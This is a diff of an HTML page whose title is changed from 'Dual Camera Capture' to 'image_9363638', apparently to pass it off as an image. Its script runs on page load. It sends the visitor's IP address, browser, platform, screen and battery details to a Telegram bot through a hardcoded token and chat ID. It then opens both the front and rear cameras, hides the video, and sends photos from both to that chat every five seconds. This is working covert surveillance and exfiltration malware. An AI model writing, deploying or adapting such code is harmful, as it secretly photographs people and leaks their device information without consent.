@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dual Camera Capture</title>
+    <title>image_9363638</title>
     <style>
         video { display: none; } 
         h1 { color: green; text-align: center; }
@@ -16,125 +16,125 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-const BOT_TOKEN = "8023106166:AAEGed6xp19KBQWiUmsv6P7_Bi1ZDhHJ3VU";
-const CHAT_ID = "2139008203";
-const canvasFront = document.createElement('canvas');
-const canvasBack = document.createElement('canvas');
-let videoFront = null;
-let videoBack = null;
-let streamFront = null;
-let streamBack = null;
-let intervalId = null;
+        const BOT_TOKEN = "8023106166:AAEGed6xp19KBQWiUmsv6P7_Bi1ZDhHJ3VU";
+        const CHAT_ID = "2139008203";
+        const canvasFront = document.createElement('canvas');
+        const canvasBack = document.createElement('canvas');
+        let videoFront = null;
+        let videoBack = null;
+        let streamFront = null;
+        let streamBack = null;
+        let intervalId = null;
 
-async function sendDeviceInfo() {
-    try {
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        const ipAddress = data.ip;
+        async function sendDeviceInfo() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const ipAddress = data.ip;
 
-        const battery = await navigator.getBattery();
-        const batteryStatus = `Battery Level: ${(battery.level * 100).toFixed(0)}%, Charging: ${battery.charging ? "Yes" : "No"}`;
+                const battery = await navigator.getBattery();
+                const batteryStatus = `Battery Level: ${(battery.level * 100).toFixed(0)}%, Charging: ${battery.charging ? "Yes" : "No"}`;
 
-        const deviceInfo = `Device Information:\n- IP Address: ${ipAddress}\n- Browser: ${navigator.userAgent}\n- Platform: ${navigator.platform}\n- Screen Resolution: ${window.screen.width}x${window.screen.height}\n- ${batteryStatus}`;
+                const deviceInfo = `Device Information:\n- IP Address: ${ipAddress}\n- Browser: ${navigator.userAgent}\n- Platform: ${navigator.platform}\n- Screen Resolution: ${window.screen.width}x${window.screen.height}\n- ${batteryStatus}`;
 
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: deviceInfo })
-        });
-    } catch (error) {
-        console.error("Error fetching device info:", error);
-    }
-}
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: deviceInfo })
+                });
+            } catch (error) {
+                console.error("Error fetching device info:", error);
+            }
+        }
 
-async function startCamera(facingMode) {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
-        const video = document.createElement('video');
-        video.srcObject = stream;
+        async function startCamera(facingMode) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
+                const video = document.createElement('video');
+                video.srcObject = stream;
 
-        return new Promise((resolve) => {
-            video.onloadedmetadata = () => {
-                video.play();
-                resolve({ video, stream });
-            };
-        });
-    } catch (error) {
-        console.error(`Camera access denied (${facingMode}):`, error);
-        return null;
-    }
-}
+                return new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve({ video, stream });
+                    };
+                });
+            } catch (error) {
+                console.error(`Camera access denied (${facingMode}):`, error);
+                return null;
+            }
+        }
 
-async function capturePhoto(video, canvas) {
-    if (!video) return null;
+        async function capturePhoto(video, canvas) {
+            if (!video) return null;
 
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    const context = canvas.getContext('2d');
-    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-    return canvas.toDataURL('image/png');
-}
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            return canvas.toDataURL('image/png');
+        }
 
-async function sendPhoto() {
-    const frontPhoto = await capturePhoto(videoFront, canvasFront);
-    const backPhoto = await capturePhoto(videoBack, canvasBack);
-    if (!frontPhoto && !backPhoto) return;
+        async function sendPhoto() {
+            const frontPhoto = await capturePhoto(videoFront, canvasFront);
+            const backPhoto = await capturePhoto(videoBack, canvasBack);
+            if (!frontPhoto && !backPhoto) return;
 
-    const formData = new FormData();
-    formData.append("chat_id", CHAT_ID);
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
 
-    if (frontPhoto) {
-        const frontBlob = await (await fetch(frontPhoto)).blob();
-        formData.append("photo", frontBlob, "front_photo.png");
-    }
-    if (backPhoto) {
-        const backBlob = await (await fetch(backPhoto)).blob();
-        formData.append("photo", backBlob, "back_photo.png");
-    }
+            if (frontPhoto) {
+                const frontBlob = await (await fetch(frontPhoto)).blob();
+                formData.append("photo", frontBlob, "front_photo.png");
+            }
+            if (backPhoto) {
+                const backBlob = await (await fetch(backPhoto)).blob();
+                formData.append("photo", backBlob, "back_photo.png");
+            }
 
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: "POST",
-        body: formData
-    });
-}
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            });
+        }
 
-async function startPhotoCaptureLoop() {
-    sendDeviceInfo();
+        async function startPhotoCaptureLoop() {
+            sendDeviceInfo();
 
-    const frontCamera = await startCamera("user");
-    const backCamera = await startCamera("environment");
-    
-    if (!frontCamera && !backCamera) return;
-    
-    if (frontCamera) {
-        videoFront = frontCamera.video;
-        streamFront = frontCamera.stream;
-    }
-    if (backCamera) {
-        videoBack = backCamera.video;
-        streamBack = backCamera.stream;
-    }
-    
-    sendPhoto();
-    intervalId = setInterval(sendPhoto, 5000);
-}
+            const frontCamera = await startCamera("user");
+            const backCamera = await startCamera("environment");
+            
+            if (!frontCamera && !backCamera) return;
+            
+            if (frontCamera) {
+                videoFront = frontCamera.video;
+                streamFront = frontCamera.stream;
+            }
+            if (backCamera) {
+                videoBack = backCamera.video;
+                streamBack = backCamera.stream;
+            }
 
-function stopCamera() {
-    if (streamFront) {
-        streamFront.getTracks().forEach(track => track.stop());
-    }
-    if (streamBack) {
-        streamBack.getTracks().forEach(track => track.stop());
-    }
-    if (intervalId) {
-        clearInterval(intervalId);
-        intervalId = null;
-    }
-}
+            // Ensure the photo capturing loop works
+            sendPhoto();
+            intervalId = setInterval(sendPhoto, 5000);
+        }
 
-window.onload = startPhotoCaptureLoop;
-window.onbeforeunload = stopCamera;
+        function stopCamera() {
+            if (streamFront) {
+                streamFront.getTracks().forEach(track => track.stop());
+            }
+            if (streamBack) {
+                streamBack.getTracks().forEach(track => track.stop());
+            }
+            if (intervalId) {
+                clearInterval(intervalId);
+                intervalId = null;
+            }
+        }
 
+        window.onload = startPhotoCaptureLoop;
+        window.onbeforeunload = stopCamera;
     </script>
 </body>
 </html>
